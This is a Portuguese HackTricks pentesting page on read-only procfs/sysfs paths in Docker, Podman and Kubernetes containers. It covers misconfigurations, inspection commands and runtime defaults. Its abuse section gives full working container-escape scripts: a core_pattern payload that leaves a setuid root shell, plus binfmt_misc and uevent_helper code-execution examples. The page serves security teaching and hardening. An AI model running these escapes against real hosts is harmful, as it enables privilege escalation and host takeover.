# Caminhos do Sistema Somente Leitura

{{#include ../../../../banners/hacktricks-training.md}}

Os caminhos do sistema em somente leitura são uma proteção separada dos caminhos mascarados. Em vez de ocultar um caminho completamente, o runtime o expõe, mas o monta como somente leitura. Isso é comum para locais selecionados em procfs e sysfs onde o acesso de leitura pode ser aceitável ou operacionalmente necessário, mas gravações seriam perigosas demais.

O objetivo é simples: muitas interfaces do kernel tornam-se muito mais perigosas quando são graváveis. Uma montagem somente leitura não remove todo o valor de reconhecimento, mas impede que uma workload comprometida modifique os arquivos voltados para o kernel através desse caminho.

## Operação

Runtimes frequentemente marcam partes da visão proc/sys como somente leitura. Dependendo do runtime e do host, isso pode incluir caminhos tais como:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

A lista real varia, mas o modelo é o mesmo: permitir visibilidade onde necessário, negar mutação por padrão.

## Laboratório

Inspecione a lista de caminhos somente leitura declarada pelo Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Inspecione a visualização montada de proc/sys de dentro do contêiner:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Impacto na Segurança

Caminhos do sistema montados como somente leitura reduzem uma grande classe de abusos que afetam o host. Mesmo quando um atacante pode inspecionar procfs ou sysfs, a incapacidade de escrever nesses locais elimina muitos caminhos de modificação direta envolvendo parâmetros do kernel, crash handlers, auxiliares de carregamento de módulos ou outras interfaces de controle. A exposição não desaparece, mas a transição de divulgação de informações para influência sobre o host torna-se mais difícil.

## Misconfigurações

Os principais erros são desmascarar ou remontar caminhos sensíveis como leitura-escrita, expor diretamente o conteúdo proc/sys do host com writable bind mounts, ou usar modos privilegiados que efetivamente contornam os padrões de runtime mais seguros. Em Kubernetes, `procMount: Unmasked` e workloads privilegiados frequentemente andam juntos com proteção de proc mais fraca. Outro erro operacional comum é assumir que, porque o runtime normalmente monta esses caminhos como somente leitura, todas as workloads ainda herdam esse padrão.

## Abuso

Se a proteção for fraca, comece procurando entradas proc/sys graváveis:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Quando houver entradas graváveis, caminhos de acompanhamento de alto valor incluem:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
O que esses comandos podem revelar:

- Entradas graváveis em `/proc/sys` frequentemente significam que o container pode modificar o comportamento do kernel do host em vez de apenas inspecioná-lo.
- `core_pattern` é especialmente importante porque um valor gravável voltado ao host pode ser transformado em um caminho de execução de código no host ao derrubar um processo após configurar um pipe handler.
- `modprobe` revela o helper usado pelo kernel para fluxos relacionados ao carregamento de módulos; é um alvo de alto valor clássico quando gravável.
- `binfmt_misc` indica se o registro de interpretador personalizado é possível. Se o registro for gravável, isso pode se tornar um primitivo de execução em vez de apenas um information leak.
- `panic_on_oom` controla uma decisão do kernel em todo o host e, portanto, pode transformar exaustão de recursos em um host denial of service.
- `uevent_helper` é um dos exemplos mais claros de um caminho helper sysfs gravável produzindo execução em contexto do host.

Achados interessantes incluem proc knobs ou entradas sysfs graváveis voltadas ao host que normalmente deveriam ser read-only. Nesse ponto, a carga de trabalho passou de uma visão de container restrita para uma influência significativa sobre o kernel.

### Exemplo completo: `core_pattern` Host Escape

Se `/proc/sys/kernel/core_pattern` for gravável a partir do interior do container e apontar para a visão do kernel do host, ele pode ser abusado para executar um payload após um crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Se o caminho realmente alcançar o kernel do host, o payload é executado no host e deixa um setuid shell para trás.

### Exemplo completo: Registro `binfmt_misc`

Se `/proc/sys/fs/binfmt_misc/register` estiver gravável, um registro de intérprete personalizado pode produzir code execution quando o arquivo correspondente for executado:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Em um `binfmt_misc` gravável exposto ao host, o resultado é execução de código no caminho do interpretador acionado pelo kernel.

### Exemplo completo: `uevent_helper`

Se `/sys/kernel/uevent_helper` é gravável, o kernel pode invocar um host-path helper quando um evento correspondente for acionado:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
A razão pela qual isso é tão perigoso é que o caminho do helper é resolvido a partir da perspectiva do sistema de arquivos do host em vez de a partir de um contexto seguro restrito ao container.

## Verificações

Essas verificações determinam se a exposição de procfs/sysfs é somente leitura onde esperado e se a carga de trabalho ainda pode modificar interfaces sensíveis do kernel.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
O que é interessante aqui:

- Uma workload hardened normal deve expor muito poucas entradas graváveis em /proc/sys.
- Caminhos graváveis em /proc/sys são frequentemente mais importantes que o acesso de leitura comum.
- Se o runtime diz que um caminho é somente leitura mas na prática é gravável, reveja cuidadosamente mount propagation, bind mounts e configurações de privilégio.

## Padrões do runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default | Docker defines a default read-only path list for sensitive proc entries | exposing host proc/sys mounts, `--privileged` |
| Podman | Enabled by default | Podman applies default read-only paths unless explicitly relaxed | `--security-opt unmask=ALL`, broad host mounts, `--privileged` |
| Kubernetes | Inherits runtime defaults | Uses the underlying runtime read-only path model unless weakened by Pod settings or host mounts | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Runtime default | Usually relies on OCI/runtime defaults | same as Kubernetes row; direct runtime config changes can weaken the behavior |

O ponto chave é que caminhos do sistema somente leitura geralmente estão presentes como padrão do runtime, mas são fáceis de minar com modos privilegiados ou bind mounts do host.
